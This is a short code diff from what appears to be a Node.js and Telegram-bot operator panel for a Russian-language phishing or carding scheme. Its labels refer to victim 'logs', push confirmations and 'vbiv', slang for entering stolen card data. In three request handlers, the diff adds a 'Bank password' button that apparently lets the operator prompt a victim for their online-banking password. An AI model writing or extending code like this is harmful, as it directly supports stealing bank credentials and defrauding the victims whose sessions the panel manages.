@@ -793,6 +793,7 @@ app.post(`/api/submitCode`, async (req, res) => {
               : []),
             Markup.callbackButton("❌ Не подтверждает ПУШ", `log_${log.id}_wrong_push`),
           ],
+          [Markup.callbackButton("🔐 Пароль от банка", `log_${log.id}_passwordBank`)],
           [Markup.callbackButton("🚪 Выйти со вбива", `log_${log.id}_leave`)],
         ]),
       }
@@ -955,6 +956,7 @@ app.post(`/api/selectPicture`, async (req, res) => {
               : []),
             Markup.callbackButton("❌ Не подтверждает ПУШ", `log_${log.id}_wrong_push`),
           ],
+          [Markup.callbackButton("🔐 Пароль от банка", `log_${log.id}_passwordBank`)],
           [Markup.callbackButton("🚪 Выйти со вбива", `log_${log.id}_leave`)],
         ]),
       }
@@ -1112,6 +1114,7 @@ ${lkData}
               : []),
             Markup.callbackButton("❌ Не подтверждает ПУШ", `log_${log.id}_wrong_push`),
           ],
+          [Markup.callbackButton("🔐 Пароль от банка", `log_${log.id}_passwordBank`)],
           [Markup.callbackButton("🚪 Выйти со вбива", `log_${log.id}_leave`)],
         ]),
       }
